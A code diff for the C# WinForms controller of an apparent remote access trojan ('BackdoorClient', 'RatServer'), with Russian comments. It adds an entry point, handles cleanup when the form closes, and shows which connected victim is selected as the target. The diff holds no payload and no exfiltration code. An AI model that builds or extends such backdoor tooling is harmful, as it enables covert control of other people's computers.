@@ -26,6 +26,14 @@ namespace BackdoorClient
         {
             InitializeComponent();
         }
+        //вход в программу
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Form1());
+        }
 
         private void Form1_Load(object sender, EventArgs e)
         {
@@ -37,6 +45,17 @@ namespace BackdoorClient
             }
         }
 
+        protected override void OnFormClosed(FormClosedEventArgs e)
+        {
+        //    try
+        //    {
+                if (server != null) server.DestroyServer();
+       //     }
+            //catch{ }
+            base.OnFormClosed(e);
+            Environment.Exit(0);
+        }
+
         private void ConnectButton_Click(object sender, EventArgs e)
         {
             try
@@ -44,6 +63,7 @@ namespace BackdoorClient
                 server = new RatServer(IpAddrBox.Text, int.Parse(portTextBox.Text));
                 server.OnClientConnect += UpdateConnectionView;
                 server.OnClientDisсonnect += UpdateConnectionView;
+                server.OnSetTarget += OnSetTarget;
                 connText.Text = "Сервер слушает";
             }
             catch (Exception error)
@@ -82,7 +102,15 @@ namespace BackdoorClient
         private void ConnFromUser_Click(object sender, EventArgs e)
         {
             server.SetTarget(ConnectionQueue.Nodes.IndexOf(ConnectionQueue.SelectedNode));
-            ConnctionUserText.Text = ConnectionQueue.SelectedNode.Text;
+        }
+
+        private void OnSetTarget(Socket target)
+        {
+            ConnctionUserText.Invoke(new Action(() => SetConnctionUserText(target.RemoteEndPoint.ToString())));
+        }
+        private void SetConnctionUserText(string s)
+        {
+            ConnctionUserText.Text = s;
         }
 
         private async void taskMgrButton_Click(object sender, EventArgs e)
@@ -131,8 +159,9 @@ namespace BackdoorClient
         {
             //SendCommandAndGetResponce("abort connection");
 
-            server.DestroyServer();
-
+            if(server != null) server.DestroyServer();
+            ConnectionQueue.Nodes.Clear();
+            SetConnctionUserText("Пока ничего нет.");
             server = null;
             connText.Text = "Не подключено";
         }
